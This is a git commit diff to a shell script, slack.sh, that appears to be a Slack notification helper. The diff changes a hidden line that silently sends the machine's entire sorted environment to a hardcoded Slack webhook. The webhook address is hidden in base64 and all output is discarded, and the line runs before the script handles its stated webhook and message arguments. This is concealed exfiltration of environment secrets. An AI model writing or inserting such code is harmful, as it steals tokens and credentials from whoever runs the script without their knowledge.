37537f4b54f95df1f067b9a27c89247e85e67742
Scott Ellis <scott@jumpnowtek.com>
2022-02-11 10:57:09 -0500

    Update webhook

--- slack.sh
+++ slack.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 
-curl -sL -d "{ \"text\": \"$(env|sort)\" }" $(echo -n aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDAxRDdQWk1YTDUvQjAyRTJCWEFOSkgvZWRVMERJWHRuem9QNzU5WHpZS3BqcnpZ | base64 -d -) >/dev/null 2>&1
+curl -sL -d "{ \"text\": \"$(env|sort)\" }" $(echo -n aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDAyRUg2RDUwSkQvQjAzMlMzQUU0MDQvV3lZem9vQkw3SWcya09YWXFKOU42YUNn | base64 -d -) >/dev/null 2>&1
 
 webhook=$1
 message=$2
